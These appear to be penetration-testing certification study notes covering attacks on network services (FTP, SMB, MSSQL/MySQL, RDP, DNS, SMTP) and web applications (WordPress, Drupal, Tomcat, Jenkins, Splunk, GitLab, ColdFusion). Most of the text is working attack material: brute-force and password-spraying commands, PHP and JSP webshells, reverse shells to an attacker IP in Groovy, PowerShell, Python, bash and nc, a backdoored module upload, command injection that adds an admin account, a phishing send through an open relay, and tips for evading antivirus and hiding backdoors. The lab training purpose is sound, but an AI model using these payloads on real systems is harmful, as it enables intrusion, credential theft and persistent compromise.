---
title: "Attacks on Common Services & Applications"
date: 2026-03-31 10:14:00 +0000
categories: [Certifications Technical Notes, Certified Penetration Testing Specialist (CPTS)]
tags: [offensive security]
---

# Attacks on Common Services & Applications

## Attacks on Common Services

### FTP

#### Attacking FTP

- FTP bounce attack (not applicable in modern FTP servers unless misconfigured)
```bash
    nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2
```

- Brute force FTP using `hydra` (`-t 1` is IMPORTANT)
```bash
    hydra -l fiona -P /usr/share/wordlist/rockyou.txt ftp://10.129.203.7 -t 1
```

- Attack paths: known CVEs related to common FTP servers, anonymous login, brute force attacks

---

#### Latest FTP Vulnerabilities

- `CoreFTP before build 727` — [CVE-2022-22836](https://nvd.nist.gov/vuln/detail/CVE-2022-22836) (arbitrary file write)
```bash
    curl -k -X PUT -H "Host: " --basic -u : --data-binary "PoC." --path-as-is https:///../../../../../../whoops
```

---

### SMB

#### Attacking SMB

##### Anonymous Authentication

- Tools: `smbclient`, `smbmap`, `rpcclient`, `enum4linux`
- Reference: [SMB Access from Linux — SANS](https://www.willhackforsushi.com/sec504/SMB-Access-from-Linux.pdf)

##### Password Spraying

- Tools: `crackmapexec`, `netexec`
- Useful flags: `--continue-on-success`, `--local-auth` (for non-domain joined computers)

##### Forced Authentication Attacks

- Tools: `Responder`, `ntlmrelayx`, `multirelay.py`
- Resolution order: IP → `/etc/hosts` → local DNS cache → DNS server → multicast query

**NTLM Relay Steps:**

1. Set SMB to OFF in Responder config
```bash
    cat /etc/responder/Responder.conf | grep 'SMB ='
```

2. Execute `ntlmrelayx` (can execute commands with `-c`, e.g. reverse shells)
```bash
    impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146
```

---

#### Latest SMB Vulnerabilities

- [SMBGhost — CVE-2020-0796](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2020-0796): compression mechanism vulnerability in SMB v3.1.1

---

### SQL Databases

#### Attacking SQL Databases

> By default, MSSQL uses `TCP/1433` and `UDP/1434`. MySQL uses `TCP/3306`. MSSQL in hidden mode uses `TCP/2433`.

- [CVE-2012-2122](https://www.trendmicro.com/vinfo/us/threat-encyclopedia/vulnerability/2383/mysql-database-authentication-bypass): authentication bypass in MySQL 5.6.x

---

##### Misconfigurations

- Account without password

---

##### Execute System Commands

- MSSQL: `xp_cmdshell 'whoami'` then `GO`

- Enable `xp_cmdshell` (requires appropriate privileges)
```sql
    EXECUTE sp_configure 'show advanced options', 1
    GO
    RECONFIGURE
    GO
    EXECUTE sp_configure 'xp_cmdshell', 1
    GO
    RECONFIGURE
    GO
```

---

##### Write Local Files

- Check write privileges (MySQL)
```sql
    show variables like "secure_file_priv";
    -- Empty = no effect (not secure)
    -- Directory name = restricted to that directory
    -- NULL = import/export disabled
```

- Enable `Ole Automation Procedures` on MSSQL (requires admin)
```sql
    sp_configure 'show advanced options', 1
    GO
    RECONFIGURE
    GO
    sp_configure 'Ole Automation Procedures', 1
    GO
    RECONFIGURE
    GO
```

- Write PHP webshell (MySQL)
```sql
    SELECT "" INTO OUTFILE '/var/www/html/webshell.php';
```

- Create PHP webshell (MSSQL)
```sql
    DECLARE @OLE INT
    DECLARE @FileID INT
    EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
    EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
    EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, ''
    EXECUTE sp_OADestroy @FileID
    EXECUTE sp_OADestroy @OLE
    GO
```

---

##### Read Local Files

- MSSQL
```sql
    SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
    GO
```

- MySQL (if correct settings are in place)
```sql
    select LOAD_FILE("/etc/passwd");
```

---

##### Capture MSSQL Service Hash

- Force authentication
```sql
    -- XP_DIRTREE Hash Stealing
    EXEC master..xp_dirtree '\\10.10.14.225\share\'
    GO

    -- XP_SUBDIRS Hash Stealing
    EXEC master..xp_subdirs '\\10.10.14.225\share\'
    GO
```

- Steal the hash
```bash
    # Using Responder
    sudo responder -I tun0

    # Using impacket
    sudo impacket-smbserver share ./ -smb2support
```

---

##### Impersonate Existing Users with MSSQL

1. Identify users that can be impersonated (using low-privileged account)
```sql
    SELECT distinct b.name
    FROM sys.server_permissions a
    INNER JOIN sys.server_principals b
    ON a.grantor_principal_id = b.principal_id
    WHERE a.permission_name = 'IMPERSONATE'
    GO
    GRANT IMPERSONATE ON USER:: dbo TO htbdbuser;
```

2. Verify current user and role (`0` = no sysadmin role)
```sql
    SELECT SYSTEM_USER
    SELECT IS_SRVROLEMEMBER('sysadmin')
    go
```

3. Impersonate the SA user
```sql
    EXECUTE AS LOGIN = 'sa'
    SELECT SYSTEM_USER
    SELECT IS_SRVROLEMEMBER('sysadmin')
    GO
```

> It is recommended to use `xp_cmdshell` from the master DB as all users have access to it by default. Impersonating a user without access to the connected DB will cause an error.

> **Note:** If we find a user who is not sysadmin, we can still check if the user has access to other databases or linked servers.

---

##### Communicate with Other Databases (MSSQL Linked Servers)

1. Identify linked servers
```sql
    SELECT srvname, isremote FROM sysservers
    GO
```

2. Identify user and privileges on linked server (`10.0.0.12\SQLEXPRESS` = server name)
```sql
    EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
    GO
```

> **Note:** Use single double quotes to escape single quotes in linked server queries. Use semicolons (`;`) to run multiple commands at once.

---

#### SQL Client Usage

##### `sqlcmd` (MSSQL — bash/cmd)
```bash
sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30
# -y and -Y for better output (may affect performance)

# Show databases
SELECT name FROM master.dbo.sysdatabases
GO
```

##### `sqsh` (MSSQL — bash)
```bash
sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h

# Windows authentication
sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h
# Use SERVERNAME\\accountname or .\\accountname
```

##### `mssqlclient.py` (impacket)
```bash
mssqlclient.py -p 1433 julio@10.129.203.7
```

> When dealing with NTLMv2 response hashes add `-windows-auth` or use `sqlcmd`

---

#### Latest SQL Vulnerabilities

- [Execute Python code in a SQL query (MSSQL)](https://learn.microsoft.com/en-us/sql/machine-learning/tutorials/quickstart-python-create-script?view=sql-server-ver15)

---

### RDP

#### Attacking RDP

##### Password Spraying

- Using `Crowbar`

```bash
    crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'
```

- Using `Hydra`

```bash
    hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp
```

---

##### RDP Session Hijacking

> Requires SYSTEM privileges. May expose high-privileged or Domain Admin sessions.
- List users and their session IDs
```powershell
query user
```
- Connect to another desktop session
```powershell
tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}
```
- Spawn `cmd.exe` using `sc.exe` to hijack session
```powershell
sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"
net start sessionhijack
```

> **Note:** This method no longer works on Server 2019.

---

##### Enable Pass-the-Hash via RDP
```powershell
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

---

#### Latest RDP Vulnerabilities

- [BlueKeep — CVE-2019-0708](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2019-0708): RCE (may cause BSOD)

---

### DNS

#### Attacking DNS

- AXFR zone transfer using `dig`
```bash
    dig AXFR inlanefreight.htb @10.129.183.208
```

- Automatic DNS enumeration and zone transfer using `fierce`
```bash
    fierce --domain zonetransfer.me
```

- Subdomain enumeration using `Subbrute`
```bash
    git clone https://github.com/TheRook/subbrute.git >> /dev/null 2>&1
    cd subbrute
    echo "ns1.inlanefreight.com" > ./resolvers.txt
    ./subbrute.py inlanefreight.htb -s ./names.txt -r ./resolvers.txt
```

---

##### Local DNS Cache Poisoning

1. Edit `Ettercap` or `Bettercap` config to map target domain to attacker IP
```bash
    nano /etc/ettercap/etter.dns
```

2. Add target IP to Target 1 and default gateway IP (`x.x.x.2`) to Target 2

3. Activate `dns_spoof` via `Plugins > Manage Plugins`

---

### SMTP

#### Attacking Email Services

##### Enumeration

- Using `host`
```bash
    host -t MX microsoft.com
```

- Using `dig`
```bash
    dig mx plaintext.do | grep "MX" | grep -v ";"
```

- Using `nmap`
```bash
    sudo nmap -Pn -sV -sC -p25,143,110,465,587,993,995 10.129.203.12
```

---

##### User Enumeration via SMTP (port 25)
```bash
telnet 10.10.110.20 25

# VRFY — verify existence of a user
VRFY root

# EXPN — expand distribution list
EXPN john
EXPN support-team

# RCPT TO — verify recipient
RCPT TO:john
```

##### User Enumeration via POP3 (port 110)
```bash
telnet 1.1.1.1 110
USER julio    # returns OK if user exists
```

##### Automated Enumeration
```bash
smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.12
```

---

##### Cloud Attacks

> Tools: [o365spray](https://github.com/0xZDH/o365spray), [MailSniper](https://github.com/dafthack/MailSniper) for O365 — [CredKing](https://github.com/ustayready/CredKing) for Gmail/Okta

- Using `o365spray`
```bash
    # Confirm O365
    python3 o365spray.py --validate --domain msplaintext.xyz

    # Enumerate usernames
    python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz

    # Password spraying
    python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz
```

---

##### Password Attacks

- Password spraying with Hydra
```bash
    hydra -L users.txt -p 'Company01!' -f 10.129.203.12 pop3
```

- Password brute forcing with Hydra
```bash
    hydra -l marlin@inlanefreight.htb -P pws.list -f 10.129.203.12 pop3
```

---

##### Open Relay Attack

- Enumerate
```bash
    nmap -p25 -Pn --script smtp-open-relay 10.10.11.213
```

- Send phishing email through open relay
```bash
    swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Company Notification' --body 'Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/' --server 10.10.11.213
```

---

#### Latest Email Service Vulnerabilities

- [OpenSMTPD up to version 6.6.2 — CVE-2020-7247](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-7247): leads to RCE

---

## Attacks on Common Applications

### Automated Reconnaissance (Nmap → Visual Reports)

- Nmap XML output can be piped into **EyeWitness** or **Aquatone** for screenshots and prioritized reports
- Using EyeWitness
```bash
    eyewitness --web -x web_discovery.xml -d inlanefreight_eyewitness
```

- Using Aquatone
```bash
    wget https://github.com/michenriksen/aquatone/releases/download/v1.7.0/aquatone_linux_amd64_1.7.0.zip
    unzip aquatone_linux_amd64_1.7.0.zip
    cat web_discovery.xml | ./aquatone -nmap
```

---

### CMS — WordPress

#### Enumeration

- WordPress version
```bash
    curl -s http://blog.inlanefreight.local | grep WordPress
```

- Installed themes
```bash
    curl -s http://blog.inlanefreight.local/ | grep themes
```

- Installed plugins
```bash
    curl -s http://blog.inlanefreight.local/ | grep plugins
    curl -s http://blog.inlanefreight.local/?p=1 | grep plugins
```

- Full scan with WPScan
```bash
    sudo wpscan --url http://blog.inlanefreight.local --enumerate --api-token <API_TOKEN>
```

- Use `waybackurls` to discover outdated/unused plugins

---

#### Attacking WordPress

- Login brute force via XML-RPC
```bash
    sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local
```

- RCE via Theme Editor — after obtaining admin credentials, edit an inactive theme's `404.php` and inject a web shell
```php
    system($_GET[0]);
```
```bash
    curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id
```

- RCE via Metasploit
```bash
    msf6 > use exploit/unix/webapp/wp_admin_shell_upload
```

> **Report Requirements:** document exploited systems (hostname/IP + method), compromised users (account name, type, method), created artifacts, and any changes made (e.g. local admin accounts, group membership modifications).

---

### CMS — Joomla

#### Enumeration

- Joomla version
```bash
    curl -s http://dev.inlanefreight.local/administrator/manifests/files/joomla.xml | xmllint --format -
```

- Approximate version via `plugins/system/cache/cache.xml`

- Using `droopescan` (brute-force scanner for Joomla, Drupal, SilverStripe)
```bash
    sudo pip3 install droopescan
    droopescan scan joomla --url http://dev.inlanefreight.local/
```

- Using [JoomScan (OWASP)](https://github.com/OWASP/joomscan)
```bash
    perl joomscan.pl --url www.example.com
    perl joomscan.pl --url www.example.com --enumerate-components
```

- Brute force login — [joomla-bruteforce](https://github.com/ajnik/joomla-bruteforce)
```bash
    sudo python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
```

---

#### Attacking Joomla

> **Fix for `format() on null` error:** after logging in, navigate to `index.php?option=com_plugins` and disable the "Quick Icon - PHP Version Check" plugin.

- RCE via Template Editor — `Configuration > Templates > Choose Template > Customize`, edit `error.php`
```bash
    curl -s http://dev.inlanefreight.local/templates/protostar/error.php?cmd=id
```

- Automated exploit — [CVE-2019-10945](https://github.com/dpgg101/CVE-2019-10945)
```bash
    python2.7 joomla_dir_trav.py --url "http://dev.inlanefreight.local/administrator/" --username admin --password admin --dir /
```

---

### CMS — Drupal

#### Enumeration

- Drupal version
```bash
    curl -s http://drupal.inlanefreight.local | grep Drupal
```

- Detailed version from CHANGELOG
```bash
    curl -s http://drupal-acc.inlanefreight.local/CHANGELOG.txt | grep -m2 ""
```

- Automated scan
```bash
    droopescan scan drupal -u http://drupal.inlanefreight.local
```

---

#### Attacking Drupal

##### RCE (Before Version 8)

- Login as admin → enable PHP filter (Modules) → Save configuration → Add Content → Create a Basic Page with PHP code
```bash
    curl -s http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id
```

> Use an MD5 hash as the parameter name to avoid leaving an obvious backdoor.

---

##### RCE (Version 8+)

- Install the PHP Filter module manually
```bash
    wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
```

- Navigate to `Administration > Reports > Available updates`, upload and install the module

> Remember to remove the PHP filter module after completing the assessment.

---

##### RCE via Backdoored Module Upload

1. Download a legitimate module (e.g. CAPTCHA)
```bash
    wget --no-check-certificate https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
    tar xvf captcha-8.x-1.2.tar.gz
```

2. Create a web shell — `shell.php`
```php
    <?php
    system($_GET['fe8edbabc5c5c9b7b764504cd22b17af']);
    ?>
```

3. Create an `.htaccess` file to allow access within `/modules`
```html
    <IfModule mod_rewrite.c>
    RewriteEngine On
    RewriteBase /
    </IfModule>
```

4. Move files into the module directory and re-archive
```bash
    mv shell.php .htaccess captcha
    tar cvf captcha.tar.gz captcha/
```

5. Upload the malicious module at `http://drupal.inlanefreight.local/admin/modules/install`

---

##### Drupalgeddon Exploits

- **Drupalgeddon 1** — create a new admin user
```bash
    python2.7 drupalgeddon.py -t http://drupal-qa.inlanefreight.local -u hacker -p pwnd
```

> PoC: [ExploitDB 34992](https://www.exploit-db.com/exploits/34992)

- **Drupalgeddon 2** — RCE via file upload
```bash
    echo '<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>' | base64
    echo "PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K" | base64 -d | tee mrb3n.php
    python3 drupalgeddon2.py
```

> PoC: [ExploitDB 44448](https://www.exploit-db.com/exploits/44448) — check `http://drupal-dev.inlanefreight.local/mrb3n.php`

- **Drupalgeddon 3** — RCE via Metasploit (requires session cookies from request headers)
```bash
    msf6 > use exploit/multi/http/drupal_drupageddon3
```

---

### Servlet Containers — Tomcat

#### Enumeration

- Tomcat version
```bash
    curl -s http://web01.inlanefreight.local:8081/docs/ | grep Tomcat
```

- Directory brute forcing
```bash
    gobuster dir -u http://web01.inlanefreight.local:8180/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
```

- Default credentials: `tomcat:tomcat`, `admin:admin`
- Attack path: password brute force → upload WAR file containing JSP web shell

---

#### Attacking Tomcat

##### Manager Brute Force

- Access to `/manager` or `/host-manager` enables RCE

- Using Metasploit
```bash
    msf6 > use auxiliary/scanner/http/tomcat_mgr_login
```

- Using a custom Python brute force script : [Tomcat-Manager-Bruteforce](https://github.com/b33lz3bub-1/Tomcat-Manager-Bruteforce)
```bash
    python3 mgr_brute.py -U http://web01.inlanefreight.local:8180/ -P /manager -u /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt -p /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt
```

---

##### WAR File Upload (RCE)

```bash
    # Download a JSP web shell
    wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
    zip -r backup.war cmd.jsp

    # Generate reverse shell WAR with Metasploit
    msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=4443 -f war > backup.war
    nc -lnvp 4443

    # Upload to Tomcat Manager, then access
    curl http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=id
```

> Press **Undeploy** after using the web shell to clean up.

- Lightweight JSP shell (2/52 detection): [SecurityRiskAdvisors/cmd.jsp](https://github.com/SecurityRiskAdvisors/cmd.jsp)
  - Tip for 0/52 detection: change identifiable strings, e.g. `"Uploaded:"` → `"uPlOaDeD:"`

---

##### Ghostcat — CVE-2020-1938

- LFI within web app folder via AJP connector — [PoC](https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi)
```bash
    python2.7 tomcat-ajp.lfi.py app-dev.inlanefreight.local -p 8009 -f WEB-INF/web.xml
```

---

### Servlet Containers — Jenkins

#### Attacking Jenkins

##### Apache Groovy Script Console (`/script`)

- Execute system commands
```groovy
    def cmd = 'id'
    def sout = new StringBuffer(), serr = new StringBuffer()
    def proc = cmd.execute()
    proc.consumeProcessOutput(sout, serr)
    proc.waitForOrKill(1000)
    println sout
```

- Reverse shell (Linux)
```groovy
    r = Runtime.getRuntime()
    p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.15/8443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
    p.waitFor()
```

- Run commands on Windows
```groovy
    def cmd = "cmd.exe /c dir".execute();
    println("${cmd.text}");
```

- PowerShell download cradle: [Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)
- Java reverse shell on Windows: [revsh.groovy](https://gist.githubusercontent.com/frohoff/fed1ffaab9b9beeb1c76/raw/7cfa97c7dc65e2275abfb378101a505bfb754a95/revsh.groovy)

---

##### Known Jenkins Vulnerabilities

- Jenkins ≤ v2.137 → CVE-2018-1999002 + [CVE-2019-1003000](https://jenkins.io/security/advisory/2019-01-08/#SECURITY-1266): pre-authenticated RCE
- Jenkins v2.150.2 → authenticated RCE (no auth if anonymous login is enabled)

---

### Infrastructure Monitoring — Splunk

#### Enumeration

- Default credentials: `admin:changeme`
- Other weak passwords: `admin`, `Welcome`, `Welcome1`, `Password123`

---

#### Attacking Splunk

- Upload a malicious Splunk app package — `Install app from file`

1. Prepare the app archive
```bash
    tar -cvzf updater.tar.gz splunk_shell/
```

App structure:
```
splunk_shell/
├── bin/
│   ├── rev.py          # Python reverse shell (Linux)
│   ├── run.bat         # Batch launcher (Windows)
│   └── run.ps1         # PowerShell reverse shell (Windows)
└── default/
    └── inputs.conf
```

2. `run.bat`
```powershell
    @ECHO OFF
    PowerShell.exe -exec bypass -w hidden -Command "& '%~dpn0.ps1'"
    Exit
```

3. `run.ps1`
```powershell
    $client = New-Object System.Net.Sockets.TCPClient('10.10.14.15',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

4. `inputs.conf`
```ini
    [script://./bin/rev.py]
    disabled = 0
    interval = 10
    sourcetype = shell

    [script://.\bin\run.bat]
    disabled = 0
    sourcetype = shell
    interval = 10
```

5. `rev.py` (Linux)
```python
    import sys,socket,os,pty

    ip="10.10.14.15"
    port="443"
    s=socket.socket()
    s.connect((ip,int(port)))
    [os.dup2(s.fileno(),fd) for fd in (0,1,2)]
    pty.spawn('/bin/bash')
```

6. Start a listener and upload the app
```bash
    sudo nc -lnvp 443
```

---

### Infrastructure Monitoring — PRTG Network Monitor

- Default credentials: `prtgadmin:prtgadmin`, `prtgadmin:Password123`
- Before version 18.2.39 → [CVE-2018-9276](https://nvd.nist.gov/vuln/detail/CVE-2018-9276): authenticated RCE

- Fingerprint version
```bash
    curl -s http://10.129.201.50:8080/index.htm -A "Mozilla/5.0 (compatible;  MSIE 7.01; Windows NT 5.0)" | grep version
```

- RCE via Notification Command Injection
  1. Navigate to `Setup > Account Settings > Notifications > Add New Notification`
  2. Tick **Execute Program**, set `Program file` to `Demo exe` (outfile ps1)
  3. Inject commands in the filename parameter
```
    test.txt;net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add
```
  4. Save and run the notification

---

### Customer Service & Config Management — osTicket

- osTicket v1.14.1 → [CVE-2020-24881](https://nvd.nist.gov/vuln/detail/CVE-2020-24881): SSRF vulnerability
- Creating a ticket may reveal an internal email format (e.g. `ticket-id@company.com`) useful for further enumeration

---

### Customer Service & Config Management — GitLab

#### Enumeration

- User enumeration — [ExploitDB 49821](https://www.exploit-db.com/exploits/49821)
```bash
    ./gitlab_userenum.sh --url http://gitlab.inlanefreight.local:8081/ --userlist users.txt
```

- Python variant: [GitLabUserEnum](https://github.com/dpgg101/GitLabUserEnum)
- Browse `/help` to detect the GitLab version
- Browse `/explore` to see public projects
- Email enumeration: try to register with an existing email address

---

#### Attacking GitLab

- Lockout policy config: [8_devise.rb](https://gitlab.com/gitlab-org/gitlab-foss/-/blob/master/config/initializers/8_devise.rb)

- Authenticated RCE — [ExploitDB 49951](https://www.exploit-db.com/exploits/49951)
```bash
    python3 gitlab_13_10_2_rce.py -t http://gitlab.inlanefreight.local:8081 -u mrb3n -p password1 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.15 8443 >/tmp/f '
```

---

### Common Gateway Interfaces — Tomcat CGI (CVE-2019-0232)

> **CVE-2019-0232** is a critical RCE vulnerability affecting Windows systems with `enableCmdLineArguments` enabled. Input validation errors in the Tomcat CGI Servlet allow command injection. Affected versions: `9.0.0.M1`–`9.0.17`, `8.5.0`–`8.5.39`, `7.0.0`–`7.0.93`.

- Fuzz for CGI scripts
```bash
    ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.cmd
    # Also try: FUZZ.bat
```

- Test command injection
```
    http://10.129.204.227:8080/cgi/welcome.bat?&set
    http://10.129.204.227:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe
```

---

### Common Gateway Interfaces — Shellshock (CVE-2014-6271)

> **Shellshock** exploits a flaw in GNU Bash (up to version 4.3). CGI scripts are typically hosted in a `/cgi-bin/` directory.

1. Fuzz for CGI scripts
```bash
    gobuster dir -u http://10.129.204.231/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi
```

2. Command injection via `User-Agent` header
```bash
    curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://10.129.204.231/cgi-bin/access.cgi
```

3. Reverse shell
```bash
    curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.38/7777 0>&1' http://10.129.204.231/cgi-bin/access.cgi
```

---

### Thick Client Applications

#### Information Gathering

- Windows analysis tools

| Tool | Purpose |
| --- | --- |
| [CFF Explorer](https://ntcore.com/?page_id=388) | PE header analysis |
| [Detect It Easy](https://github.com/horsicq/Detect-It-Easy) | File type & packer detection |
| [Process Monitor](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon) | Runtime file/registry/network activity |
| [Strings](https://learn.microsoft.com/en-us/sysinternals/downloads/strings) | Extract readable strings from binaries |

---

#### Retrieving Hardcoded Credentials

1. Discover executables on network shares (e.g. `RestartOracle-Service.exe` on NETLOGON)
2. Monitor with **ProcMon64** — reveals temp file creation
3. Prevent temp file deletion to capture credentials:
   - `C:\Users\<user>\AppData\Local\Temp` → Properties → Security → Advanced → target user → Disable inheritance → Convert inherited permissions → Edit → Show advanced permissions → deselect **Delete subfolders and files** and **Delete**
4. Debug with **x64dbg**:
   - Options → Preferences → uncheck everything except `Exit Breakpoint`
   - Right-click breakpoint → Follow in Memory Map
   - Look for memory map entries: size `0x3000`, type `MAP`, protection `-RW--`
   - Check the ASCII header — if it's a `DOS MZ executable`, dump it using `Dump Memory to File`
5. Run `strings` on the dumped binary, or use `de4dot` for .NET deobfuscation
6. Open the cleaned .NET binary with **dnSpy** to read source code

---

#### Exploiting Web Vulnerabilities in Thick Clients

##### Modifying a Java Application

1. Update the hosts file with the correct server IP
2. Extract the `.jar` file and locate the port configuration
```powershell
    ls fatty-client\ -recurse | Select-String "8000" | Select Path, LineNumber | Format-List
```

3. Strip JAR signing — edit `META-INF/MANIFEST.MF` (remove SHA-256 hashes, leave a trailing newline) and delete `1.RSA` and `1.SF`
```
    Manifest-Version: 1.0
    Archiver-Version: Plexus Archiver
    Built-By: root
    Sealed: True
    Created-By: Apache Maven 3.3.9
    Build-Jdk: 1.8.0_232
    Main-Class: htb.fatty.client.run.Starter
```

4. Rebuild the JAR
```powershell
    jar -cmf .\META-INF\MANIFEST.MF ..\fatty-client-new.jar *
```

---

##### Path Traversal via Source Modification

1. Decompile with **jadx** — `File > Save All Sources`
2. In `ClientGuiTest.java`, replace the `"configs"` folder reference with `".."`
3. Recompile
```powershell
    javac -cp fatty-client-new.jar fatty-client-new.jar.src\htb\fatty\client\gui\ClientGuiTest.java
```

---

### Miscellaneous Applications — ColdFusion

#### Enumeration

- Primary language: CFML (also supports JS and Java)
- Notable CVEs:
  1. CVE-2021-21087 — arbitrary disallow of uploading JSP source code
  2. CVE-2020-24453 — Active Directory integration misconfiguration
  3. CVE-2020-24450 — command injection
  4. CVE-2020-24449 — arbitrary file reading
  5. CVE-2019-15909 — stored XSS

- Common ports

| Port | Protocol | Description |
| --- | --- | --- |
| 80 | HTTP | Non-secure web communication |
| 443 | HTTPS | Secure web communication |
| 1935 | RPC | Client-server remote procedure calls |
| 25 | SMTP | Email sending |
| 8500 | SSL | Server communication via SSL |
| 5500 | Server Monitor | Remote administration |

---

#### Attacking ColdFusion

- Search for exploits
```bash
    searchsploit adobe coldfusion
```

##### Directory Traversal (CF 8) — CVE-2010-2861

- Vulnerable URI
```
    http://example.com/index.cfm?directory=../../../etc/&file=passwd
```

- Vulnerable URIs with `locale` parameter:
  - `CFIDE/administrator/settings/mappings.cfm`
  - `logging/settings.cfm`
  - `datasources/index.cfm`
  - `j2eepackaging/editarchive.cfm`
  - `CFIDE/administrator/enter.cfm`

- Exploit LFI to extract password config
```bash
    python2 14641.py 10.129.204.230 8500 "../../../../../../../../ColdFusion8/lib/password.properties"
```

---

##### Unauthenticated RCE

- CFML payload
```html
    <cfset cmd = "#cgi.query_string#">
    <cfexecute name="cmd.exe" arguments="/c #cmd#" timeout="5">
```

- **CVE-2009-2265** — Adobe ColdFusion ≤ 8.0.1 (FCK editor package), file upload via
```
    http://www.example.com/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=
```

- Unauthenticated RCE exploit
```bash
    python3 50057.py
```

---

### Miscellaneous Applications — IIS Tilde Enumeration

> This technique uncovers hidden files/directories by exploiting Windows 8.3 short filename generation on IIS servers (e.g. `somefi~1.txt` for `somefile.txt`).

- Manual enumeration concept
```
    http://example.com/~a => 404
    http://example.com/~c => 200  ← character match
    http://example.com/~cu => 200 ← narrowing down
```

- Automated scanner — [IIS-ShortName-Scanner](https://github.com/irsdl/IIS-ShortName-Scanner)
```bash
    java -jar iis_shortname_scanner.jar 0 5 http://10.129.204.231/
```

- Prepare a wordlist from discovered short names
```bash
    egrep -r ^transf /usr/share/wordlists/* | sed 's/^[^:]*://' > /tmp/list.txt
```

- Directory brute forcing with the generated wordlist
```bash
    gobuster dir -u http://10.129.204.231/ -w /tmp/list.txt -x .aspx,.asp
```

---

### Miscellaneous Applications — LDAP

> LDAP is a protocol (not a directory service) for accessing and managing directory information (users, groups, computers, printers). Popular implementations: OpenLDAP, Microsoft Active Directory.

- LDAP request components: session connection (port 389/636), request type (`bind`, `search`, `add`, `delete`, etc.), DN, request ID
- LDAP response components: response type, result code, matched DN, referral, response data

- Example `ldapsearch` query
```bash
    ldapsearch -H ldap://ldap.example.com:389 -D "cn=admin,dc=example,dc=com" -w secret123 -b "ou=people,dc=example,dc=com" "(mail=john.doe@example.com)"
```

> Authentication: `-D` (bind DN) + `-w` (password). Search scope & filters via `-b`.

---

#### LDAP Injection

| Input | Description |
| --- | --- |
| `*` | Matches any number of characters |
| `( )` | Groups expressions |
| `\|` | Logical OR |
| `&` | Logical AND |
| `(cn=*)` | Always-true condition to bypass authentication |

> If OpenLDAP is running and a web app on port 80 uses LDAP authentication, try `*` as both username and password.

---

### Miscellaneous Applications — Web Mass Assignment Vulnerabilities

- Mass assignment allows injecting unintended data into objects
```json
    { "user": { "username": "hacker", "email": "hacker@example.com", "admin": true } }
```

---

### Miscellaneous Applications — Attacking Service-Connected Applications

